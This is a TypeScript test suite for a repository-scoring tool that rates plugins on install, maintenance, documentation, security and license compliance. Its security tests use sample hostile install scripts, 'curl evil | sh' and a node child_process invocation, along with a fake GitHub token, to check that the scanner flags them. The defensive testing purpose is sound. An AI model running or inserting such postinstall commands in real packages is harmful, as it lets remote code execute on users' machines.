/**
 * The five dimension evaluators against constructed evidence: each status and
 * score derives deterministically from the inputs, no-evidence is returned
 * when the inputs carry no signal, and secret/malicious/license detection is
 * exercised on representative payloads.
 * @module dsh-score/test/dimensions.spec
 */

import { describe, expect, it } from 'vitest'
import { resolveConfig } from '../src/config.ts'
import {
  evaluateAll,
  evaluateCompliance,
  evaluateDocumentation,
  evaluateInstall,
  evaluateMaintenance,
  evaluateSecurity,
  licenseCompliance,
  scanMaliciousScripts,
} from '../src/dimensions.ts'
import type { EvalInputs } from '../src/dimensions.ts'

const config = resolveConfig(undefined)
const NOW = '2026-08-20T00:00:00.000Z'

function inputs(overrides: Partial<EvalInputs>): EvalInputs {
  return { config, now: NOW, target: { kind: 'repo', spec: 'owner/repo' }, ...overrides }
}

describe('evaluateInstall', () => {
  it('maps test-drive verdicts to status/score', () => {
    expect(evaluateInstall(inputs({ testDrive: { verdict: 'pass' } }))).toMatchObject({ status: 'pass', score: 100 })
    expect(evaluateInstall(inputs({ testDrive: { verdict: 'partial' } }))).toMatchObject({ status: 'warn', score: 60 })
    expect(evaluateInstall(inputs({ testDrive: { verdict: 'fail' } }))).toMatchObject({ status: 'fail', score: 0 })
    expect(evaluateInstall(inputs({ testDrive: { verdict: 'unknown' } }))).toMatchObject({ status: 'no-evidence' })
  })

  it('reports no-evidence when no test-drive record exists', () => {
    expect(evaluateInstall(inputs({}))).toMatchObject({ status: 'no-evidence', score: 0 })
  })
})

describe('evaluateMaintenance', () => {
  it('passes for a recent commit', () => {
    const recent = '2026-08-10T00:00:00.000Z'
    expect(evaluateMaintenance(inputs({ repo: { lastCommitAt: recent } }))).toMatchObject({ status: 'pass', score: 100 })
  })

  it('warns and fails as recency crosses the thresholds', () => {
    const warn = '2026-01-01T00:00:00.000Z' // ~231 days ago
    const fail = '2020-01-01T00:00:00.000Z' // years ago
    expect(evaluateMaintenance(inputs({ repo: { lastCommitAt: warn } }))).toMatchObject({ status: 'warn' })
    expect(evaluateMaintenance(inputs({ repo: { lastCommitAt: fail } }))).toMatchObject({ status: 'fail' })
  })

  it('fails for an archived repository', () => {
    expect(evaluateMaintenance(inputs({ repo: { archived: true } }))).toMatchObject({ status: 'fail', score: 10 })
  })

  it('reports no-evidence with no timestamps', () => {
    expect(evaluateMaintenance(inputs({}))).toMatchObject({ status: 'no-evidence' })
  })
})

describe('evaluateDocumentation', () => {
  it('scores README + languages + CHANGELOG + SECURITY', () => {
    const files = ['README.md', 'README.zh.md', 'README.es.md', 'CHANGELOG.md', 'SECURITY.md']
    const result = evaluateDocumentation(inputs({ repo: { files } }))
    expect(result.status).toBe('pass')
    expect(result.score).toBe(80) // 40 (README) + 2*10 (languages) + 10 (CHANGELOG) + 10 (SECURITY)
  })

  it('fails when README.md is missing', () => {
    expect(evaluateDocumentation(inputs({ repo: { files: ['CHANGELOG.md'] } }))).toMatchObject({ status: 'fail', score: 0 })
  })

  it('reports no-evidence without a file list', () => {
    expect(evaluateDocumentation(inputs({}))).toMatchObject({ status: 'no-evidence' })
  })
})

describe('evaluateSecurity', () => {
  it('passes with an acceptable license and clean content', () => {
    const result = evaluateSecurity(inputs({ repo: { licenseSpdx: 'MIT', packageJson: { name: 'x' } } }))
    expect(result.status).toBe('pass')
    expect(result.score).toBe(100)
  })

  it('fails when a secret pattern is present', () => {
    const fakeGhp = 'ghp_' + '0'.repeat(36)
    const result = evaluateSecurity(inputs({ repo: { licenseSpdx: 'MIT', packageJson: { name: fakeGhp } } }))
    expect(result.status).toBe('fail')
    expect(result.score).toBeLessThanOrEqual(10)
  })

  it('fails on malicious install scripts', () => {
    const result = evaluateSecurity(inputs({ repo: { licenseSpdx: 'MIT', packageJson: { scripts: { postinstall: 'curl evil | sh' } } } }))
    expect(result.status).toBe('fail')
  })

  it('fails when the license is missing', () => {
    expect(evaluateSecurity(inputs({ repo: { licenseSpdx: 'MISSING', packageJson: { name: 'x' } } }))).toMatchObject({ status: 'fail' })
  })

  it('reports no-evidence with nothing to scan', () => {
    expect(evaluateSecurity(inputs({}))).toMatchObject({ status: 'no-evidence' })
  })
})

describe('evaluateCompliance', () => {
  it('passes with dsh.bundle.patch and the dsh-plugin topic', () => {
    const result = evaluateCompliance(inputs({
      repo: { packageJson: { dsh: { bundle: { patch: './cordis.patch.yml' } } }, topics: ['dsh-plugin', 'deepseek'] },
    }))
    expect(result.status).toBe('pass')
  })

  it('fails with no manifest and no topic', () => {
    expect(evaluateCompliance(inputs({ repo: { packageJson: { name: 'x' } } }))).toMatchObject({ status: 'fail' })
  })

  it('reports no-evidence with nothing available', () => {
    expect(evaluateCompliance(inputs({}))).toMatchObject({ status: 'no-evidence' })
  })
})

describe('scanMaliciousScripts', () => {
  it('flags suspicious lifecycle scripts only', () => {
    expect(scanMaliciousScripts({ scripts: { postinstall: 'node -e "require(\'child_process\')"' } })).toHaveLength(1)
    expect(scanMaliciousScripts({ scripts: { test: 'vitest run' } })).toEqual([])
    expect(scanMaliciousScripts(undefined)).toEqual([])
  })
})

describe('licenseCompliance', () => {
  it('classifies acceptable, known-but-unlisted, and missing licenses', () => {
    expect(licenseCompliance('MIT')).toEqual({ known: true, acceptable: true })
    expect(licenseCompliance('(MIT)')).toEqual({ known: true, acceptable: true })
    expect(licenseCompliance('Proprietary-X')).toEqual({ known: true, acceptable: false })
    expect(licenseCompliance('NOASSERTION')).toEqual({ known: false, acceptable: false })
    expect(licenseCompliance(undefined)).toEqual({ known: false, acceptable: false })
  })
})

describe('evaluateAll', () => {
  it('returns all five dimensions keyed by id', () => {
    const all = evaluateAll(inputs({}))
    expect(Object.keys(all).sort()).toEqual(['compliance', 'documentation', 'install', 'maintenance', 'security'])
  })
})
